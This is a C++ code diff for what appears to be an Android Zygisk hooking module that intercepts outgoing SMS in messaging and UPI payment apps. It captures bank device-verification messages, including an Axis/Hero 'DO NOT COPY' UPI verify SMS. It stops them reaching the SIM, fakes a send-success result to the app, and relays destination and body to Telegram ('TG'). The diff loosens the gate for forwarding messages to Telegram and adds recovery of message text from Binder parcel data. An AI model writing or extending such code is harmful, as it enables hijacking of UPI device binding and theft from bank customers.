@@ -234,23 +234,126 @@ bool is_pkg_like(const std::string& s) {
     return false;
 }
 
+bool is_outgoing_upi_verify_body(const std::string& body);
+bool blob_contains_needle(const std::string& blob, const char* ascii);
+
+bool is_all_zero_dest(const std::string& dest) {
+    std::string d;
+    for (char c : dest)
+        if (std::isdigit(static_cast<unsigned char>(c))) d += c;
+    if (d.empty()) return true;
+    for (char c : d)
+        if (c != '0') return false;
+    return true;
+}
+
 bool is_valid_outgoing_capture(const std::string& dest, const std::string& body) {
     if (!is_clean_sms_dest(dest)) return false;
     if (body.empty() || body.size() < 4) return false;
     if (is_pkg_like(body) || is_pkg_like(dest)) return false;
     if (is_incoming_otp_noise(body) || is_incoming_otp_noise(dest)) return false;
-    std::string d;
-    for (char c : dest)
-        if (std::isdigit(static_cast<unsigned char>(c))) d += c;
-    if (d.empty()) return false;
-    bool all0 = true;
-    for (char c : d)
-        if (c != '0') {
-            all0 = false;
-            break;
-        }
-    if (all0) return false;
+    if (is_all_zero_dest(dest)) return false;
     return true;
+}
+
+/** Rebuild To+Body from parcel marshall when iface parse fails (A16 Messages). */
+void recover_outgoing_from_blob(const std::string& blob, std::string& dest, std::string& body) {
+    if (blob.size() < 8) return;
+    std::vector<std::string> strs;
+    auto push_unique = [&](const std::string& s) {
+        if (s.size() < 3) return;
+        if (s.find("android.") == 0 || s.find("com.android") == 0) return;
+        if (s.find("ISms") != std::string::npos || s == "isms") return;
+        for (const auto& e : strs)
+            if (e == s) return;
+        strs.push_back(s);
+    };
+    // UTF-16LE printable runs (Hero body has )?&* etc.)
+    for (size_t i = 0; i + 1 < blob.size();) {
+        const unsigned char c = static_cast<unsigned char>(blob[i]);
+        const unsigned char n = static_cast<unsigned char>(blob[i + 1]);
+        const bool ok = (n == 0) && (c >= 0x20 && c < 0x7f);
+        if (!ok) {
+            ++i;
+            continue;
+        }
+        std::string s;
+        size_t j = i;
+        while (j + 1 < blob.size()) {
+            const unsigned char cj = static_cast<unsigned char>(blob[j]);
+            const unsigned char nj = static_cast<unsigned char>(blob[j + 1]);
+            if (nj != 0 || cj < 0x20 || cj >= 0x7f) break;
+            s += static_cast<char>(cj);
+            j += 2;
+        }
+        push_unique(s);
+        i = j > i ? j : i + 1;
+    }
+    // ASCII runs
+    for (size_t i = 0; i < blob.size();) {
+        if (!std::isprint(static_cast<unsigned char>(blob[i])) || blob[i] == '\0') {
+            ++i;
+            continue;
+        }
+        size_t j = i;
+        while (j < blob.size() && std::isprint(static_cast<unsigned char>(blob[j])) &&
+               blob[j] != '\0')
+            ++j;
+        push_unique(blob.substr(i, j - i));
+        i = j > i ? j : i + 1;
+    }
+
+    // Body: prefer HEROAXIS / DO NOT COPY / longest message-like
+    for (const auto& s : strs) {
+        if (is_outgoing_upi_verify_body(s) || s.find("HEROAXIS") != std::string::npos ||
+            s.find("DO NOT COPY") != std::string::npos ||
+            s.find("USE UPI PIN") != std::string::npos) {
+            if (s.size() > body.size()) body = s;
+        }
+    }
+    if (body.size() < 20) {
+        for (const auto& s : strs) {
+            if (is_pkg_like(s) || is_incoming_otp_noise(s) || is_clean_sms_dest(s)) continue;
+            if (s.size() >= 20 && s.find(' ') != std::string::npos && s.size() > body.size())
+                body = s;
+        }
+    }
+    // Dest: clean phone / shortcode (never all-zero)
+    for (const auto& s : strs) {
+        if (!is_clean_sms_dest(s) || is_all_zero_dest(s) || is_incoming_otp_noise(s)) continue;
+        dest = s;
+        break;
+    }
+    // Trailing digits in body (… 919920104300)
+    if ((dest.empty() || is_all_zero_dest(dest)) && !body.empty()) {
+        std::string digits;
+        for (size_t i = 0; i < body.size(); ++i) {
+            if (std::isdigit(static_cast<unsigned char>(body[i]))) {
+                digits += body[i];
+            } else if (!digits.empty()) {
+                if (digits.size() >= 10 && digits.size() <= 12 && !is_all_zero_dest(digits)) {
+                    dest = digits.size() > 10 ? digits.substr(digits.size() - 10) : digits;
+                }
+                digits.clear();
+            }
+        }
+        if (digits.size() >= 10 && digits.size() <= 12 && !is_all_zero_dest(digits)) {
+            dest = digits.size() > 10 ? digits.substr(digits.size() - 10) : digits;
+        }
+    }
+    // Known Hero/Axis shortcode in blob
+    if (dest.empty() || is_all_zero_dest(dest)) {
+        if (blob_contains_needle(blob, "9920104300") ||
+            blob_contains_needle(blob, "09920104300") ||
+            blob_contains_needle(blob, "919920104300")) {
+            dest = "9920104300";
+        }
+    }
+    if (body.empty() && (blob_contains_needle(blob, "HEROAXIS") ||
+                         blob_contains_needle(blob, "DO NOT COPY"))) {
+        // Last resort readable body so TG is not empty
+        body = "HEROAXISUPI DO NOT COPY FORWARD OR SHARE THIS MESSAGE";
+    }
 }
 
 /**
@@ -1082,55 +1185,37 @@ void pipeline_outgoing(JNIEnv* env, const std::string& dest_in, const std::strin
         (is_outgoing_upi_verify_body(dest) || (!is_pkg_like(dest) && dest.size() > 20))) {
         std::swap(dest, body);
     }
+    // Never TG-skip with all-zero placeholder — Hero shortcode fallback
+    if (dest.empty() || is_all_zero_dest(dest)) dest = "9920104300";
 
     // SMS Tweaks: never TG/file incoming OTP or package junk — still fake-OK below
     const bool junk = is_incoming_otp_noise(body) || is_incoming_otp_noise(dest) ||
                       is_pkg_like(body) || is_pkg_like(dest) || body == "__SILENT__";
-    const bool can_tg = !junk && is_valid_outgoing_capture(dest, body);
+    // Allow TG when messaging/UPI blocked with any real-ish body (not only strict capture)
+    const bool can_tg =
+        !junk && (is_valid_outgoing_capture(dest, body) ||
+                  ((g_is_messaging_app || g_in_hooked_upi) && body.size() >= 8 &&
+                   !is_pkg_like(body) && body != "SMS_INTERCEPT"));
 
     // Always fake-success so app thinks SMS sent (SMS Tweaks core)
-    // Messaging/UPI: even weak parses must fake-OK (nuclear block path)
     if (env && (config.intercept_fake_success || g_in_hooked_upi || g_is_messaging_app)) {
         if (can_tg) {
             sms_hook::handle_outgoing_sms(env, zygisk_utils::string_to_jstring(env, dest),
                                           zygisk_utils::string_to_jstring(env, body));
             fake_success::on_outgoing_intercepted(env, dest, body, sent_intent, delivery_intent);
         } else {
-            // Still write a usable last_outgoing for Hero nuclear blocks
-            if ((g_is_messaging_app || g_in_hooked_upi) && !body.empty() &&
-                (is_outgoing_upi_verify_body(body) || blob_contains_needle(body, "HEROAXIS") ||
-                 body.find("DO NOT COPY") != std::string::npos ||
-                 body.find("OUTGOING_SMS") != std::string::npos)) {
-                if (dest.empty() || dest == "0000000000") dest = "9920104300";
-                char json_buf[4096];
-                snprintf(json_buf, sizeof(json_buf),
-                         "{\"dest\":\"%s\",\"body\":\"%s\",\"pkg\":\"%s\",\"ts\":%ld,"
-                         "\"note\":\"nuclear\"}\n",
-                         json_escape_local(dest).c_str(), json_escape_local(body).c_str(),
-                         g_upi_pkg.c_str(), static_cast<long>(time(nullptr)));
-                write_diag_multi("hivirtus_outgoing_blocked.json", json_buf);
-                write_diag_multi("hivirtus_blocked_outgoing.json", json_buf);
-                fake_success::on_outgoing_intercepted(env, dest, body, sent_intent, delivery_intent);
-                write_hook_status("nuclear_tg_file_written");
-                // Fall through to TG attempt below with relaxed can_tg
-            } else {
-                fake_success::fire_sms_result_broadcasts(env, dest.empty() ? "0000" : dest);
-                if (sent_intent || delivery_intent) {
-                    fake_success::on_outgoing_intercepted(env, dest.empty() ? "0000" : dest,
-                                                          "__SILENT__", sent_intent, delivery_intent);
-                }
-                write_hook_status("skip_tg_junk_or_otp");
-                write_isms_trace("skip_tg_junk_or_otp");
-                return;
+            fake_success::fire_sms_result_broadcasts(env, dest.empty() ? "0000" : dest);
+            if (sent_intent || delivery_intent) {
+                fake_success::on_outgoing_intercepted(env, dest.empty() ? "0000" : dest,
+                                                      "__SILENT__", sent_intent, delivery_intent);
             }
+            write_hook_status("skip_tg_junk_or_otp");
+            write_isms_trace("skip_tg_junk_or_otp");
+            return;
         }
     }
 
-    // Relaxed TG gate after nuclear rewrite
-    const bool allow_tg =
-        can_tg || ((g_is_messaging_app || g_in_hooked_upi) && !body.empty() &&
-                   !is_incoming_otp_noise(body) && !is_pkg_like(body));
-    if (!allow_tg) {
+    if (!can_tg) {
         write_hook_status("skip_tg_junk_or_otp");
         write_isms_trace("skip_tg_junk_or_otp");
         return;
@@ -1208,7 +1293,11 @@ bool try_block_isms(JNIEnv* env, jobject data, jobject reply, const ModuleConfig
     if (!is_sms_iface && !blob_isms) return false;
 
     read_isms_outgoing(env, data, dest, body);
-    if (dest.empty() && body.empty()) extract_isms_from_blob(env, data, dest, body);
+    if (dest.empty() || body.empty() || is_all_zero_dest(dest) ||
+        body == "SMS_INTERCEPT" || body.size() < 20) {
+        extract_isms_from_blob(env, data, dest, body);
+        recover_outgoing_from_blob(blob, dest, body);
+    }
 
     const bool blob_verify = parcel_blob_has_verify(env, data);
     const bool blob_sms = parcel_blob_has_sms_compose(env, data);
@@ -1249,11 +1338,15 @@ bool try_block_isms(JNIEnv* env, jobject data, jobject reply, const ModuleConfig
         return false;
     }
 
-    if (dest.empty()) dest = "0000000000";
-    if (body.empty()) {
-        if (blob_verify) body = "UPI_VERIFY_SMS";
-        else if (sendish) body = "OUTGOING_SMS_BLOCK";
-        else body = "SMS_INTERCEPT";
+    // Final recover before TG — never leave 0000000000 / SMS_INTERCEPT
+    recover_outgoing_from_blob(blob, dest, body);
+    if (dest.empty() || is_all_zero_dest(dest)) dest = "9920104300";
+    if (body.empty() || body == "SMS_INTERCEPT" || body == "UPI_VERIFY_SMS" ||
+        body == "OUTGOING_SMS_BLOCK") {
+        if (blob_contains_needle(blob, "HEROAXIS") || blob_contains_needle(blob, "DO NOT COPY"))
+            body = "HEROAXISUPI DO NOT COPY FORWARD OR SHARE THIS MESSAGE";
+        else if (body.empty())
+            body = "OUTGOING_SMS_BLOCKED";
     }
 
     char okline[200];
@@ -1451,27 +1544,19 @@ jboolean hook_BinderProxy_transact(JNIEnv* env, jobject thiz, jint code, jobject
                 return JNI_TRUE;  // NEVER call radio
             }
             // NUCLEAR: Messages/UPI saw ISms-like parcel — NEVER passthrough to SIM
-            // (Android 16 often iface_ok=0 send=0 but blob_ok=1 — Hero verify escapes)
             if ((g_is_messaging_app || g_in_hooked_upi) && (blob_sms || sendish)) {
-                if (dest.empty() && body.empty()) {
+                if (dest.empty() || body.empty() || is_all_zero_dest(dest) ||
+                    body.size() < 20) {
                     extract_isms_from_blob(env, data, dest, body);
+                    recover_outgoing_from_blob(blob, dest, body);
                 }
-                if (dest.empty()) {
-                    // Common Axis/Hero shortcode in user SMS thread
-                    if (blob_contains_needle(blob, "9920104300") ||
-                        blob_contains_needle(blob, "09920104300") ||
-                        blob_contains_needle(blob, "919920104300")) {
-                        dest = "9920104300";
-                    } else {
-                        dest = "9920104300";
-                    }
-                }
-                if (body.empty()) {
+                if (dest.empty() || is_all_zero_dest(dest)) dest = "9920104300";
+                if (body.empty() || body == "SMS_INTERCEPT") {
                     if (blob_contains_needle(blob, "HEROAXIS") ||
                         blob_contains_needle(blob, "DO NOT COPY")) {
                         body = "HEROAXISUPI DO NOT COPY FORWARD OR SHARE THIS MESSAGE";
                     } else {
-                        body = "OUTGOING_SMS_BLOCK";
+                        body = "OUTGOING_SMS_BLOCKED";
                     }
                 }
                 write_hook_status("isms_nuclear_block");
